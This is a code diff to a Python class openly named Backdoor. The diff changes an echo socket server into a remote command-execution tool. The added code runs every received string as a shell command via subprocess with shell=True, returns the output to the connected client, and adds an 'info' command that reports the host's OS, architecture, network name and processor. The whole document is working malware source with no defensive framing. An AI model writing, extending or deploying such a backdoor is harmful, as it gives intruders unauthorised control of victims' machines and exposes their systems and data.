@@ -1,7 +1,10 @@
 import socket
+import subprocess
+import platform
 
 class Backdoor:
     data_size = 2048
+    custom_commands = ['info']
 
     def __init__(self, host, port):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,18 +34,40 @@ class Backdoor:
                 self.__stop()
                 break
 
-            # Print the received data
-            print("[*] DATA:", data.decode('utf-8'))
-            print(f"Received {len(data)} bytes")
+            cmd = data.decode('utf-8')
 
-            self.client.send(data)
+            if cmd not in self.custom_commands:
+                output = self.run_command(data.decode('utf-8'))
 
+                if output is not False:
+                    self.client.send(output.encode('utf-8'))
+                else:
+                    msg = f"[-] Cannot execute the command {cmd}"
+                    self.client.send(msg.encode('utf-8'))
+
+            if cmd == 'info':
+                self.client.send(self.get_platform_info().encode('utf-8'))
+                continue
+
+    def run_command(self, cmd):
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        if result.returncode == 0:
+            return result.stdout
+        else:
+            return False
     def __stop(self):
         # Close the connection
         self.socket.close()
         print(f"[-] Closing connection {self.addr[0]}")
 
+    def get_platform_info(self):
+        info = f"Platform: {platform.system()}\n"
+        info += f"Architecture: {platform.architecture()[0]}\n"
+        info += f"Machine type: {platform.machine()}\n"
+        info += f"Network name: {platform.node()}\n"
+        info += f"Processor Info: {platform.processor()}"
 
+        return info
 
 if __name__ == "__main__":
     host = socket.gethostbyname(socket.gethostname())
